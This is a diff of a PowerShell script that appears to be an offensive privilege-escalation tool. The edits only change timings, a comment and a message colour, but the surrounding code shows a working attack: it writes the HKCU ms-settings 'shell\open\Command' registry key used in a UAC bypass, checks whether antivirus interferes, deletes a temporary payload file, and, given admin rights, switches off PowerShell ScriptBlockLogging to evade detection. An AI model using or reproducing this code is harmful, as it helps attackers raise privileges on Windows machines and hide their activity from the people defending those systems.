@@ -122,7 +122,7 @@ If($CheckVuln -eq $True -or $param2 -ieq "-Force"){
    }
 
    ## Anti-Virus registry Hive|Keys detection checks.
-   New-Item "HKCU:\Software\Classes\ms-settings\shell\open\Command" -Force -EA SilentlyContinue|Out-Null;Start-Sleep -Milliseconds 300
+   New-Item "HKCU:\Software\Classes\ms-settings\shell\open\Command" -Force -EA SilentlyContinue|Out-Null;Start-Sleep -Milliseconds 350
    If(-not(Test-Path "HKCU:\Software\Classes\ms-settings\shell\open\Command") -and $param2 -iNotMatch '-Force'){
       If(Test-Path "$Env:TMP\CompDefault.ps1"){Remove-Item -Path "$Env:TMP\CompDefault.ps1" -Force -EA SilentlyContinue}
       Write-Host "[ ] System Doesn't Seems Vulnerable, Aborting." -ForegroundColor red -BackgroundColor Black
@@ -131,9 +131,9 @@ If($CheckVuln -eq $True -or $param2 -ieq "-Force"){
       Exit
    }
 
-   ## Disable AMSI ScriptBlockLogging (IF found admin shell)
+   ## Disable AMSI Logging (Admin Shell)
    If($IsClientAdmin -eq $True){
-      Write-Host "[ ] Admin     => Disable AMSI ScriptBlockLogging." -ForeGroundColor Green;Start-Sleep -Milliseconds 400
+      Write-Host "[ ] Admin     => Disable AMSI ScriptBlockLogging." -ForeGroundColor Yellow
       New-Item -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Force -EA SilentlyContinue|Out-Null
       Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value "0" -Type "DWORD" -Force -EA SilentlyContinue|Out-Null
    }
